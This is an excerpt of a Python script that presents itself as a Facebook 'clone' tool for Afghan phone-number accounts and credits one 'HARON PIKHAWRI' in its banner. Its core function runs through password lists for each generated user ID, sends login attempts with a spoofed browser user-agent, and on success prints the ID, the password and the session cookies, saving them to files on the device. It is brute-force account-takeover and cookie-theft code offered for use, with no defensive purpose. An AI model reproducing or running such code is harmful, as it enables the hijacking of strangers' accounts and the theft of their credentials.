...
.##.....##.##.....##.##.....##..#######..##....##
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : HARON PIKHAWRI
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : UNKNOWN  
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : HARON PIKHAWRI
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : NOT BAD
\033[1;90m══════════════════════════════════════════════════""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
...
def AFG():
		user=[]
		clear()
		print('\033[1;32m Code example: 9379,9378,9377,9370')
		...
		mthd = input(' Choose: ')
		clear()
		print(' \n\033[1;32m [1] \033[1;32mCLONE WITH AUTO PASS (AFG) ')
		linex()
		pcs = input(' [?] Select: ')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [HARON]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6489.97 Safari/537.36',}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;36m [HARON~OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[1;32m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/F-haron-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/F-Haron-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
